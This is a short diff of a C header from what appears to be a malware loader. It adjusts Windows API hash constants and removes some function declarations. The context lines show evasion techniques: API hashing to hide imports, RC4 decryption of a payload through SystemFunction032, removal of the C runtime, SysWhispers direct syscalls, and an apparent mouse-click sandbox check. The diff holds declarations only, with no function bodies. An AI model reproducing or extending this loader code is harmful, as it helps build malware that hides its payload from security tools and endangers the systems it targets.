@@ -27,6 +27,7 @@ extern DWORD g_dwMouseClicks;
 // Windows API hash values
 #define USER32DLLHashValue								0x5644677D
 #define KERNEL32DLLHashValue							0xEC1C6278
+#define KERNELBASEHashValue								0x0D9940F7
 
 #define FindResourceWHashValue							0x83CECA7F
 #define LoadResourceHashValue							0xFF951427
@@ -674,17 +675,10 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 
 // Defined and used by ApiHashing.cx
 #define CONTAINING_RECORD(address, type, field) ((type *)( (char *)(address) - (ULONG_PTR)(&((type *)0)->field) ))
-
-FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
 FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue);
-
-HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
 HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue);
 
 BOOL InitializeWinApis();
-
-// Used for removing CRT lib
-PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
 
 // Used in SysWhispers.c
 typedef struct _SYSTEM_HANDLE
